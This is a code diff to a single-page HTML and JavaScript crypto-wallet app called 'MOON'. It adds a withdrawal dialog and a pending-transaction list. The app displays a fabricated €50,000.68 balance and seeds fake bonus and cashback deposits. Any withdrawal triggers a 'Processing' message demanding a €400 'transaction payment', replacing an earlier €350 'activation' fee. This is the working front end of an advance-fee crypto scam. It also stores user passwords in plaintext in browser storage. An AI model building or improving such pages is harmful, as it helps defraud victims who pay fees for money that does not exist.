@@ -259,6 +259,11 @@ color:#ff4f7b;
 font-weight:600;
 }
 
+.yellow{
+color:#fbbf24;
+font-weight:600;
+}
+
 /* TRANSACTIONS */
 
 .transaction{
@@ -311,6 +316,201 @@ gap:4px;
 .active{
 opacity:1;
 color:#00e5ff;
+}
+
+/* WITHDRAW MODAL */
+
+.modal-overlay{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.7);
+z-index:100;
+justify-content:center;
+align-items:center;
+padding:20px;
+}
+
+.modal{
+background:#0b1023;
+border-radius:30px;
+padding:25px;
+width:100%;
+max-width:380px;
+border:1px solid rgba(255,255,255,.08);
+box-shadow:0 0 40px rgba(0,255,255,.1);
+}
+
+.modal-title{
+font-size:22px;
+font-weight:700;
+margin-bottom:20px;
+}
+
+.method-select{
+display:flex;
+gap:10px;
+margin-bottom:20px;
+}
+
+.method-btn{
+flex:1;
+padding:14px;
+background:#121933;
+border:2px solid transparent;
+border-radius:16px;
+color:white;
+font-size:14px;
+font-weight:600;
+cursor:pointer;
+transition:.3s;
+display:flex;
+flex-direction:column;
+align-items:center;
+gap:6px;
+}
+
+.method-btn:hover{
+background:#182041;
+}
+
+.method-btn.active-method{
+border-color:#00e5ff;
+background:#182041;
+}
+
+.method-icon{
+font-size:22px;
+}
+
+.input-group{
+margin-bottom:16px;
+}
+
+.input-label{
+font-size:12px;
+opacity:.7;
+margin-bottom:8px;
+display:block;
+text-transform:uppercase;
+letter-spacing:1px;
+}
+
+.input-field{
+width:100%;
+padding:16px;
+border:none;
+outline:none;
+border-radius:16px;
+background:#121933;
+color:white;
+font-size:15px;
+}
+
+.input-field::placeholder{
+color:#9aa4c7;
+}
+
+.amount-input{
+font-size:24px;
+font-weight:700;
+text-align:center;
+}
+
+.balance-info{
+text-align:center;
+font-size:13px;
+opacity:.7;
+margin-bottom:20px;
+}
+
+.modal-actions{
+display:flex;
+gap:12px;
+margin-top:10px;
+}
+
+.modal-actions button{
+flex:1;
+}
+
+.cancel-btn{
+background:#121933 !important;
+color:#9aa4c7 !important;
+}
+
+.cancel-btn:hover{
+background:#1b2348 !important;
+}
+
+/* PROCESSING ALERT MODAL */
+
+.alert-overlay{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.8);
+z-index:200;
+justify-content:center;
+align-items:center;
+padding:20px;
+}
+
+.alert-box{
+background:#0b1023;
+border-radius:30px;
+padding:30px;
+width:100%;
+max-width:360px;
+border:1px solid rgba(255,255,255,.08);
+box-shadow:0 0 50px rgba(0,255,255,.15);
+text-align:center;
+}
+
+.alert-icon{
+font-size:50px;
+margin-bottom:15px;
+}
+
+.alert-title{
+font-size:20px;
+font-weight:700;
+margin-bottom:10px;
+}
+
+.alert-text{
+font-size:14px;
+opacity:.8;
+line-height:1.6;
+margin-bottom:20px;
+}
+
+.alert-highlight{
+color:#fbbf24;
+font-weight:700;
+}
+
+.alert-btn{
+width:100%;
+}
+
+/* PENDING BADGE */
+
+.pending-badge{
+background:rgba(251,191,36,.15);
+color:#fbbf24;
+padding:3px 10px;
+border-radius:20px;
+font-size:11px;
+font-weight:600;
+letter-spacing:1px;
+text-transform:uppercase;
 }
 
 </style>
@@ -392,7 +592,7 @@ Premium Member
 Available Balance
 </div>
 
-<div class="balance">
+<div class="balance" id="balanceDisplay">
 €50,000.68
 </div>
 
@@ -417,7 +617,7 @@ Deposit
 
 <!-- WITHDRAW -->
 
-<div class="action" onclick="withdrawAlert()">
+<div class="action" onclick="openWithdrawModal()">
 <div class="icon">🏦</div>
 Withdraw
 </div>
@@ -456,8 +656,7 @@ display:flex;
 justify-content:center;
 align-items:center;
 font-size:24px;
-color:white;
-">
+color:white;">
 ₿
 </div>
 
@@ -486,8 +685,7 @@ margin-top:18px;
 padding-top:15px;
 border-top:1px solid rgba(255,255,255,.06);
 display:flex;
-justify-content:space-between;
-">
+justify-content:space-between;">
 
 <div>
 <div class="small">Price</div>
@@ -551,7 +749,7 @@ Smart Chain
 Recent Transactions
 </div>
 
-<div class="card">
+<div class="card" id="transactionList">
 
 <div class="transaction">
 
@@ -626,6 +824,8 @@ Yesterday
 
 </div>
 
+</div>
+
 <!-- NAVIGATION -->
 
 <div class="bottom">
@@ -659,7 +859,74 @@ Yesterday
 
 </div>
 
+<!-- WITHDRAW MODAL -->
+
+<div class="modal-overlay" id="withdrawModal">
+
+<div class="modal">
+
+<div class="modal-title">Withdraw Funds</div>
+
+<div class="method-select">
+
+<button class="method-btn active-method" id="paypalBtn" onclick="selectMethod('paypal')">
+<div class="method-icon">💳</div>
+PayPal
+</button>
+
+<button class="method-btn" id="bankBtn" onclick="selectMethod('bank')">
+<div class="method-icon">🏦</div>
+Bank
+</button>
+
+</div>
+
+<div class="input-group">
+<label class="input-label">Account Details</label>
+<input type="text" class="input-field" id="accountDetail" placeholder="PayPal Email">
+</div>
+
+<div class="input-group">
+<label class="input-label">Amount (€)</label>
+<input type="number" class="input-field amount-input" id="withdrawAmount" placeholder="0.00" step="0.01" min="1">
+</div>
+
+<div class="balance-info" id="balanceInfo">Available: €50,000.68</div>
+
+<div class="modal-actions">
+<button class="cancel-btn" onclick="closeWithdrawModal()">Cancel</button>
+<button onclick="processWithdrawal()">Send</button>
+</div>
+
+</div>
+
+</div>
+
+<!-- PROCESSING ALERT MODAL -->
+
+<div class="alert-overlay" id="processingAlert">
+
+<div class="alert-box">
+
+<div class="alert-icon">⏳</div>
+
+<div class="alert-title">Processing...</div>
+
+<div class="alert-text">
+Your withdrawal request is being processed.<br><br>
+To complete the withdrawal, you need to make a <span class="alert-highlight">transaction payment of €400</span> now.
+</div>
+
+<button class="alert-btn" onclick="closeProcessingAlert()">Got it</button>
+
+</div>
+
+</div>
+
 <script>
+
+let currentBalance = 50000.68;
+let selectedMethod = 'paypal';
 
 function createAccount(){
 
@@ -685,6 +952,15 @@ localStorage.setItem("moonName",name);
 localStorage.setItem("moonEmail",email);
 
 localStorage.setItem("moonPassword",password);
+
+// Initialize default transactions
+let defaultTransactions = [
+  { icon: "⬇️", name: "Deposit", date: "Today", amount: 8000, type: "in", status: "completed" },
+  { icon: "🎁", name: "Bonus Reward", date: "Yesterday", amount: 2450, type: "in", status: "completed" },
+  { icon: "🎉", name: "Cashback Reward", date: "2 days ago", amount: 650, type: "in", status: "completed" }
+];
+localStorage.setItem("moonTransactions", JSON.stringify(defaultTransactions));
+localStorage.setItem("moonBalance", currentBalance);
 
 alert("MOON Account Created 🌙");
 
@@ -728,16 +1004,134 @@ document.getElementById("dashboard").style.display="block";
 document.getElementById("welcomeUser").innerHTML =
 localStorage.getItem("moonName");
 
+// Load saved balance
+let savedBalance = localStorage.getItem("moonBalance");
+if(savedBalance){
+  currentBalance = parseFloat(savedBalance);
+}
+updateBalanceDisplay();
+renderTransactions();
+
 }
 
-/* WITHDRAW ALERT */
+function updateBalanceDisplay(){
+  document.getElementById("balanceDisplay").innerHTML = "€" + currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+  document.getElementById("balanceInfo").innerHTML = "Available: €" + currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+}
 
+function openWithdrawModal(){
+  document.getElementById("withdrawModal").style.display = "flex";
+  document.getElementById("withdrawAmount").value = "";
+  document.getElementById("accountDetail").value = "";
+  selectMethod('paypal');
+}
+
+function closeWithdrawModal(){
+  document.getElementById("withdrawModal").style.display = "none";
+}
+
+function selectMethod(method){
+  selectedMethod = method;
+  document.getElementById("paypalBtn").classList.remove("active-method");
+  document.getElementById("bankBtn").classList.remove("active-method");
+  
+  if(method === 'paypal'){
+    document.getElementById("paypalBtn").classList.add("active-method");
+    document.getElementById("accountDetail").placeholder = "PayPal Email";
+  } else {
+    document.getElementById("bankBtn").classList.add("active-method");
+    document.getElementById("accountDetail").placeholder = "IBAN / Account Number";
+  }
+}
+
+function processWithdrawal(){
+  let account = document.getElementById("accountDetail").value.trim();
+  let amount = parseFloat(document.getElementById("withdrawAmount").value);
+  
+  if(!account){
+    alert("Please enter your " + (selectedMethod === 'paypal' ? "PayPal email" : "bank account number"));
+    return;
+  }
+  
+  if(!amount || amount <= 0){
+    alert("Please enter a valid amount");
+    return;
+  }
+  
+  if(amount > currentBalance){
+    alert("Insufficient balance!");
+    return;
+  }
+  
+  // Deduct balance
+  currentBalance -= amount;
+  localStorage.setItem("moonBalance", currentBalance);
+  updateBalanceDisplay();
+  
+  // Add to transaction history as PENDING
+  let transactions = JSON.parse(localStorage.getItem("moonTransactions") || "[]");
+  let methodName = selectedMethod === 'paypal' ? 'PayPal' : 'Bank Transfer';
+  
+  transactions.unshift({
+    icon: "⏳",
+    name: "Withdraw to " + methodName,
+    date: "Just now",
+    amount: amount,
+    type: "out",
+    status: "pending"
+  });
+  
+  localStorage.setItem("moonTransactions", JSON.stringify(transactions));
+  renderTransactions();
+  
+  closeWithdrawModal();
+  
+  // Show processing alert
+  showProcessingAlert();
+}
+
+function showProcessingAlert(){
+  document.getElementById("processingAlert").style.display = "flex";
+}
+
+function closeProcessingAlert(){
+  document.getElementById("processingAlert").style.display = "none";
+}
+
+function renderTransactions(){
+  let transactions = JSON.parse(localStorage.getItem("moonTransactions") || "[]");
+  let html = "";
+  
+  transactions.forEach(function(tx){
+    let amountClass = tx.type === "in" ? "green" : (tx.status === "pending" ? "yellow" : "red");
+    let amountSign = tx.type === "in" ? "+" : "-";
+    let amountFormatted = amountSign + " €" + tx.amount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    
+    let statusBadge = "";
+    if(tx.status === "pending"){
+      statusBadge = `<span class="pending-badge">Processing</span>`;
+    }
+    
+    html += `
+    <div class="transaction">
+      <div class="left">
+        <div class="circle">${tx.icon}</div>
+        <div>
+          <div>${tx.name} ${statusBadge}</div>
+          <div class="small">${tx.date}</div>
+        </div>
+      </div>
+      <div class="${amountClass}">${amountFormatted}</div>
+    </div>
+    `;
+  });
+  
+  document.getElementById("transactionList").innerHTML = html;
+}
+
+/* Old withdraw function replaced */
 function withdrawAlert(){
-
-alert(
-"You need to make the payment of €350 to activate withdrawal."
-);
-
+  openWithdrawModal();
 }
 
 </script>
